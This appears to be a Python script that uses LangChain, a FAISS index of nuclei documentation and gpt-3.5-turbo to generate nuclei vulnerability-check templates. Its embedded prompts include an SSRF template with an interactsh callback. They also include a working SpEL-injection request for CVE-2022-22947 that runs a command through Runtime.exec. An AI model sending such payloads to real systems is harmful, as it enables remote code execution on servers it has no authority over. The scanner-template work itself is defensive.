import os
import sys
from langchain.vectorstores.faiss import FAISS
import logging
import pickle
import platform
from langchain.embeddings import OpenAIEmbeddings
from langchain.document_loaders import UnstructuredMarkdownLoader
from langchain.text_splitter import MarkdownTextSplitter
from pathlib import Path
from prompt import prompt_template
from langchain.prompts import (
    ChatPromptTemplate,
    SystemMessagePromptTemplate,
    HumanMessagePromptTemplate,
)

logging.basicConfig(stream=sys.stdout, level=logging.INFO)
logging.getLogger().addHandler(logging.StreamHandler(stream=sys.stdout))

PART = "wiki"
ps = list(Path(f"./data/{PART}").glob("**/*.md"))

os_name = platform.system()
clear_command = 'cls' if os_name == 'Windows' else 'clear'

def create_search_index():
    source_chunks = []
    for file in ps:
        fname = file
        loader = UnstructuredMarkdownLoader(file)
        markdown_splitter = MarkdownTextSplitter(chunk_size=2048, chunk_overlap=128)
        markdown_docs = loader.load()
        markdown_docs = [x.page_content for x in markdown_docs]
        chunks = markdown_splitter.create_documents(markdown_docs)
        for chunk in chunks: chunk.metadata["source"] = fname # need to add the source to doc
        source_chunks.extend(chunks)
    
    search_index = FAISS.from_documents(source_chunks, OpenAIEmbeddings()) 

    search_index.save_local(f"{PART}.faiss")
    search_index.index = None

    #saving FAISS search index to disk
    with open("search_index.pickle", "wb") as f:
            pickle.dump(search_index, f)
    return "search_index.pickle"

def ask_openai():
    from langchain.chains import RetrievalQAWithSourcesChain,RetrievalQA
    from langchain.chat_models import ChatOpenAI
    vectorstore = FAISS.load_local(f"{PART}.faiss",embeddings=OpenAIEmbeddings())
    
    messages = [
        SystemMessagePromptTemplate.from_template(prompt_template),
        HumanMessagePromptTemplate.from_template("{question}")
    ]
    chat_prompt = ChatPromptTemplate.from_messages(messages)

    chain_type_kwargs = {"prompt": chat_prompt}
    llm = ChatOpenAI(model_name="gpt-3.5-turbo", temperature=0, max_tokens=2048)
    qa =RetrievalQA.from_chain_type(
    #qa = RetrievalQAWithSourcesChain.from_chain_type(
        #llm=OpenAI(temperature=0,model_name="gpt-3.5-turbo",max_tokens=2048),
        llm=llm,
        chain_type="stuff",
        #vectorstore = vectorstore,
        retriever=vectorstore.as_retriever(),
        return_source_documents=True,
        chain_type_kwargs = chain_type_kwargs
    )

    questions = """
    Please read the following error info according to the operation documentation of the nuclei tool:

    ```yaml
    id: taintwebapp-ssrf

    info:
    name: TaintWebapp SSRF Vulnerability
    author: wh4am1
    severity: medium
    reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6666
    cwe: CWE-918

    requests:
    - raw:
        - |
            GET /taintwebapp/SSRFServlet?url={{interactsh-url}} HTTP/1.1
            Host: 192.168.73.229:8080
            Connection: close

        matchers-condition: and
        matchers:
        - type: word
            part: interactsh_protocol # Confirms the DNS Interaction
            words:
            - "dns"
        - type: word
            part: interactsh_request
            words:
            - "www.baidu.com"
    ```

    Error info: line 8: field cwe not found in type model.Info.Please modify the above code and generate correct yaml code
    
    """

    question_text = """
    Please read the following HTTP request according to the operation documentation of the nuclei tool:
    ```
    POST /actuator/gateway/routes/hacktest HTTP/1.1
    Host: 192.168.73.229:8080
    Content-Type: application/json
    Content-Length: 185

    {
        "id":"hacktest",
        "filters":[{
            "name":"RewritePath",
            "args":{
                "_genkey_0": "#{T(java.lang.Runtime).getRuntime().exec(\"calc\")}",
                "_genkey_1": "/${path}"
            }
        }]
    }
    ```

    The HTTP response is as follows:
    ```
    HTTP/1.1 201 Created
    ```

    The above request response is the spel injection vulnerability in spring cloud gateway versions prior to 3.1.1+ and 3.0.7+. Severity level is High.The author of the discovery is VMware, and the cve number is CVE-2022-22947. Help me generate a nuclei poc, requiring the use of nuclei Use the built-in DNSLOG to judge the vulnerability.And judging that the HTTP response status code is 201 Created.Don't generate too many explanations for me, I only need the complete yaml code.Use the dns protocol of interactsh_protocol, and modify the cmd command parameter to ping interactsh address,also mark {{Hostname}}.
    """

    result = qa({"query": question_text})
    print(result)

if __name__=='__main__':
    os.environ["OPENAI_API_KEY"] = "sk-xxxxxxxxxxxxxxxxxxxxxxxxx"
    #create_search_index()
    ask_openai()